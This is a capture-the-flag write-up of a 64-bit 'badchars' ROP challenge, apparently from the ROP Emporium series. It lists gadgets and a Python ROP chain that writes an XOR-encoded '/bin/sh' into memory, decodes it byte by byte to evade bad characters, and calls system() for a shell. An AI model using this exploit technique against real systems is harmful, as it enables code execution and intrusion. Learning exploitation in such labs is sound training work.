# badchars - 64 bit

we are progressing in the series and the challanges are becoming more interesting.  
     
this time we have to deal with badchars.
    
badchars are characters that will not appear in memory the way we expect them to     
and therefore will cause unexpected behaviour.    
     
for example: a null byte is the most common bad char as it will usually(not in this challange though) terminate strings. 
    
we are granted with a list of bad chars when we execute the binary. 
    
![begin](https://user-images.githubusercontent.com/60041914/78296351-3a98d600-7536-11ea-99f1-b680518e923f.png)
   
when checking out the gadgets we should look for ways to bypass this constraint.    
it's time to get creative.     
looking around I find these gadgets useful:  
```assembly_x86
0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
0x0000000000400b40 : pop r14 ; pop r15 ; ret
0x0000000000400b39 : pop rdi ; ret
0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
0x0000000000400b3b : pop r12 ; pop r13 ; ret
```
   
you might understand what I'm getting at just by looking at them.    
my plan is to place a string in memory("/bin/sh")    
whose bad chars are xored with a key and then xor these same chars again.    

plan in detail:    
1.xor the bad chars in our string with a key      
2.use "pop r12 ; pop r13 ; ret" to set r12 to the string, r13 the desired address           
3.use "mov qword ptr [r13], r12 ; ret" to write the string to memory        
preform step 4,5 for each xored char:       
4.use "pop r14 ; pop r15 ; ret" to set r14 to the key,r15 to the address of the char           
5.use "xor byte ptr [r15], r14b ; ret" to xor them       
6.use "pop rdi ; ret" to point rdi to our decrypted string in memory      
7.call system    
8.profit????    
     
the rop chain looks like this:   
```python
bad_chars=['b', 'i', 'c', '/' ,' ','f','n','s']

CALL_SYSTEM=0x004006f0
STR_ADDR=0x00601100
SET_RDI=0x00400b39
SET_XOR_REGS = 0x00400b40
XOR_BYTES=0x00400b30
SET_REGS=0x00400b3b
WRITE_MEM=0x00400b34

xor_key=0x12

def write_str(s,addr,exp):
    #write 8 byte string with bad chars
    exp+=p64(SET_REGS)
    s=list(s)
    xored_s=[chr(ord(ch)^xor_key) if ch in bad_chars else ch for ch in s]
    exp+="".join(xored_s)
    exp+=p64(addr)
    exp+=p64(WRITE_MEM)
    for ch in s:
        if ch in bad_chars:
            exp+=p64(SET_XOR_REGS)
            exp+=chr(xor_key)+"\x00"*7
            exp+=p64(addr)
            exp+=p64(XOR_BYTES)
        addr+=1

    return exp

r=process("./badchars")
exploit=b'A'*40
exploit=write_str("/bin/sh\x00",STR_ADDR,exploit)
exploit+=p64(SET_RDI)
exploit+=p64(STR_ADDR)
exploit+=p64(CALL_SYSTEM)
```
    
it works!     
![sof](https://user-images.githubusercontent.com/60041914/78296354-3bca0300-7536-11ea-987b-6d79073ae313.png)
